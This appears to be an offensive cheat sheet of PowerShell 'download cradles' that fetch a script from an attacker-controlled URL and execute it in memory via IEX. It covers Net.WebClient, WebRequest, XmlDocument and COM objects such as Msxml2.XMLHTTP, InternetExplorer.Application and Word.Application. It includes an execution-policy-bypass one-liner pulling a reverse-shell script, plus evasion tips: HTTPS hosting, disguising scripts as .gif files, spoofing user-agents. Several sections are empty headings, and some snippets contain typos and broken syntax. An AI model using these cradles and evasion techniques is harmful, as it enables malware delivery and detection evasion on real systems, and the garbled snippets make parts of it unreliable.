Download and run within the PowerShell process memory
IEX is only useful for downloading and executing PS1 scripts and BATCH (.BAT) files into memory. This will NOT download and execute an EXE file into memory.
# deploy http server
```python
python -m SimpleHTTPServer 80 # python 2.x
python -m http.server 80 # python 3.x
```

# Net.WebClient DownloadString Method
```powershell
cmd> powershell.exe -nop -ep bypass -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1')"
```
```powershell
PS> iex (New-Object Net.Webclient).DownloadString ("http://attacker_url/script.ps1")
```
```powershell
PS> $downloader = New-Object System.Net.WebClient
PS> $payload = "http://attacker_url/script.ps1"
PS> $command = $downloader.DownloadString($payload)
PS> Invoke-Expression $command
```
Evasion Tips:
- When hosting your remote PowerShell script, to have an SSL certificate configured on the attacker machine. This helps in evading over-the-wire heuristics as our traffic will go over HTTPS
- Help in evading basic file extension heuristics is to give our PowerShell script a different extension, for instance, “Logo.gif”. PowerShell will still execute it as a.ps1 script.
- Net.WebClient class allows us to specify a custom user-agent string when sending the request to our attacker URL.
```powershell
PS> $downloader = New-Object System.Net.WebClient
PS> $downloader.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36")
PS> $payload = "http://192.168.13.62/Get-ProcessPaths.psi"
PS> $command = $downloader.DownloadString($payload)
PS> iex $command
```
# Net.WebClient DownloadData Method
# Net.WebClient OpenRead Method
# Net.WebRequest class
```powershell
PS> $req = [System.Net.WebRequest]::Create("http://attacker_URL/script.ps1") # Instantiate our System.Net.WebRequest class as the $req variable
PS> $res = $req.GetResponse() # Create a $res variable to store the WebRequest response
PS> iex ([System.IO.StreamReader]($res.GetResponseStream())).ReadToEnd() # Use the “Invoke-Expression” alias (iex) to invoke the System.IO.StreamReader and execute our code
```
```powershell
# configure to use proxy
PS> $req = [System.Net.WebRequest]::Create("http://attacker URL/script.ps1"
PS> $req.GetResponse()
PS> $proxy = [Net.WebRequest::GetSystemWebProxy()
PS> $proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
PS> $req.Proxy
PS> iex ([System.IO.StreamReader]($res.GetResponseStream())).ReadToFEnd (
```
# Certutil.exe w/ -ping argument
# System.Xml.XmIDocument
Execute a powershell command (or any system command) contained within an attacker hosted XML document.
Likely not detected, especially when combined with a server over HTTPS.
```xml
# create an XML file
<?xml version="1.0"?>
<command>
	<a>
		<execute>Get-Process</execute>
	</a>
</command>
```
```powershell
# execute hosted XML file
PS> $xmldoc = New-Object System.Xml.XmlDocument 
PS> $xmldoc.Load("http://attacker_url/file.xml")
PS> iex $xmldoc.command.a.execute
```
# COM Objects
To both download and execute scripts on target systems.
All of the COM Objects are proxy- aware, and will by default, use system configured proxies, except for the “WinHttp.WinHttpRequest.5.1” object, although that object can be configured to use one if needed.
## Msxml2.XMLHTTP Com Object 
```powershell
PS> $downloader = New-Object -ComObject Msxml2.XMLHTTP 
PS> $downloader.open("GET", "http://attacker_URL/script.psl", $false)
PS> $downloader.send()
PS> iex $downloader.responseText
```
## Microsoft.XMLHTTP Com Object 
## InternetExplorer.Application COM Object
The `InternetExplorer.Application` COM Object represents an instance of the Internet Explorer browser. It can be automated to navigate to web pages, manipulate browser settings, and retrieve content.
```powershell
$ie = New-Object -ComObject InternetExplorer.Application # Create InternetExplorer.Application COM Object
$ie.Navigate("http://example.com") # Navigate to the URL
# Wait for the page to load (optional)
while ($ie.Busy) {
    Start-Sleep -Milliseconds 100
}
$content = $ie.Document.body.innerText # Extract content from the loaded page (optional)
$ie.Quit() # Close the Internet Explorer instance
Invoke-Expression $content # Execute the retrieved content in memory
```
## Word.Application COM Object
The `Word.Application` COM Object is used for automating Microsoft Word. It allows you to create, manipulate, and interact with Word documents programmatically.
The script content is then downloaded using `New-Object System.Net.WebClient).DownloadString($scriptUrl)` and added to the Word document. The rest of the code remains the same for saving the document to a MemoryStream and executing its content in memory.
```powershell
# URL of the remote PowerShell script
$scriptUrl = "http://<IP>:<port>/<skrypt.ps1>"
$scriptContent = (New-Object System.Net.WebClient).DownloadString($scriptUrl) # Download the PowerShell script content
$word = New-Object -ComObject Word.Application # Create Word.Application COM Object
$document = $word.Documents.Add() # Create a new document
# Add a paragraph with the downloaded PowerShell script content
$paragraph = $document.Paragraphs.Add()
$paragraph.Range.Text = $scriptContent
# Save the document in memory (optional)
$memoryStream = New-Object IO.MemoryStream
$document.SaveAs([ref]$memoryStream)
$word.Quit() # Close the Word application
$documentContent = [System.Text.Encoding]::UTF8.GetString($memoryStream.ToArray()) # Convert the saved document to string
Invoke-Expression $documentContent # execute in memory
```
## Excel.Application COM Object 
## MsXml2.ServerXmlHttp Com Object 
## WinHttp.WinHttpRequest.5.1 (Not Proxy Aware)
```powershell
# Powershell
$downloader = New-Object -ComObject WinHttp.WinHttpRequest.5.1
$downloader.open("GET", "http://attacker_URL/script.psl", $false)
$downloader.send()
iex $downloader.responseText
```